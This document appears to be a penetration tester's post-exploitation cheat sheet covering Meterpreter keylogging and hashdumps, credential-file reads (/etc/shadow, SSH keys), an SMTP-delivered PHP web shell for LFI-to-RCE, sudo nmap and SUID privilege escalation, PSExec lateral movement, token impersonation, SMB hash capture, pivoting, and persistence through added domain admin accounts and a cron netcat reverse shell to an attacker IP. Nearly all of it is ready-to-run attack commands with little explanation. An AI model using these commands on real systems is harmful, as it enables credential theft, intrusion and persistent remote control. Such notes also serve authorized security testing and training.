meterpreter > search -f *password*  

meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

post/windows/gather/enum_logged_on_users
post/windows/gather/credentials/winscp

C:\Windows\system32> net users
C:\Windows\system32> net localgroup Administrators

cat .bash_history

netsh advfirewall firewall show rule name=all

# Important Files

## Linux

/etc/passwd
/etc/group
/etc/shadow

/var/spool/cron
/home/user/.ssh/id_rsa

find /etc | grep iptables

## Windows

systeminfo
C:\Windows\SoftwareDistribution\Download
C:\WIndows\WindowsUpdate.log

## 32 bit binaries
C:\Windows\system32
C:\WIndowsSysWow64

## 64 bit binaries
C:\Windows\SysNative

## Share files with win machine (SMB share)

in kali -> `impackert-smbserver example  /home/example/shares`
in win -> `\\ip\example\`

# LFI to RFI

## PHP Sessions

* Get PHP session location from PHP Information
* `cat /tmp/sess_<id>` to see the content of the session
* Set a cookie / session variable with the exploit code and access it over LFI

## Use emails

* Send email with SMTP and access it from LFI
```
telnet example.com 25
EHLO example.com
VRFY example@example.com
mail from:example1@example.com
rcpt to:example@example.com
data
Subject: S
<?php echo system($_REQUEST['cmd']); ?>

.
```

```
http://example.com/lfi?path=../../../var/mail/example
```

# Railgun

* allows direct access to Windows APIs

```
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client
>> client.railgun.shell32.IsUserAnAdmin
```

# Privilege Escalation

`post/muli/recon/local_exploit_suggester`

## Windows Local Escalation

exploit/windows/local/ms11_080_afdjoinleaf
exploit/windows/local/bypassuac -> getsystem

## Linux

LinEnum
LinuxPrivChecker
UnixPrivesc

```
uname -a
lsb_release -a
```

### udev vulnerabilities
```
udevadm --version (device manager)
```

```
/usr/share/exploitdb/searchsploit udev
gcc -o exploit 8572.c
ps aux | grep udev
cat /proc/net/netlink (PID of the udev daemon minus 1)
```

### motd

If `motd.legal-displayed` is present in home.

```
/usr/share/exploitdb/searchsploit motd
```

```
dkpk -i | grep -i pam
```

### dirtycow.ninja

Can crash boxes.

### nmap

Check if nmap is in `sudu -l`
```
sudo nmap --interactive
nmap> !sh
```

### Write access to cron

### Find set UID binaries

find / -perm -4000 2>/dev/null | xargs ls -la

### Using dash

Dash does not strip SUID bit when executing. Hence, it is possible to set UID bit and run it to get root shell.

# Lateral Movement

## PSExec (windows)

```
exploit/windows/smb/psexec
```

* PSExec uploads a Windows service executable to the ADMIN$ share.
* Connects to the Windows Service Control Manager using remote procedure call (RPC) to start the executable service.
* The service then sets up an SMB named pipe to send commands and remotely control the target system.

Credentials:
* Can pass the plain text password or the hash

meterpreter > hashdump
post/windows/gather/hashdump
post/windows/gather/smart_hashdump (gather AD credentials if available)

## SSHExec (mainly linux)

```
exploit/multi/ssh/sshexec
```

# Token Attacks

* Incognito searches all handles on the system to determine which ones belong to tokens using low-level Windows API calls.

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token BOOKXP\\secret
meterpreter > getuid
```

# SMB Capture

Capture domain hashes without having access to the controller.

```
auxiliary/server/capture/smb
   set JOHNPWFILE /root/johnfile
   exploit
```

In victim machine:
```
meterpreter > shell
C:\Documents and Settings\secret>net use \\192.168.20.9\blah
```

In SMB capture:
```
[*] SMB Captured - 2015-08-14 15:11:16 -0400
NTLMv1 Response Captured from 192.168.20.10:1078 â€“ 192.168.20.10
USER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
LMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424
NTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c
```

# Pivoting

## Metasploit Pivoting

Any traffic we send from Metasploit to the 172.16.85.0 network will automatically be routed through the session 2

```
msf > route add 172.16.85.0 255.255.255.0 2
```

```
scanner/portscan/tcp  
auxiliary/scanner/smb/smb_version
windows/meterpreter/bind_tcp (reverse wont work since networks are different)
```

## ProxyChains

```
msf > use auxiliary/server/socks4a
```
Edit the configuration file for ProxyChains at /etc/proxychains.conf

```
proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190
```

## SSH tunneling.

# Persistence

## Add user

### Windows
```
net user james password /add
net localgroup Administrators james /add
```

```
net user georgia2 password /add /domain
net group "Domain Admins" georgia2 /add /domain
```
### Linux

##  Meterpreter

```
meterpreter > run persistence -h
meterpreter > run persistence -r 192.168.20.9 -p 2345 -U
```

## Cron

```
*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash
```

## Empire Metasploit Unicorn interactions

Check IppSec's Blue video

## MySQL to shell

`mysql> \! /bin/sh`
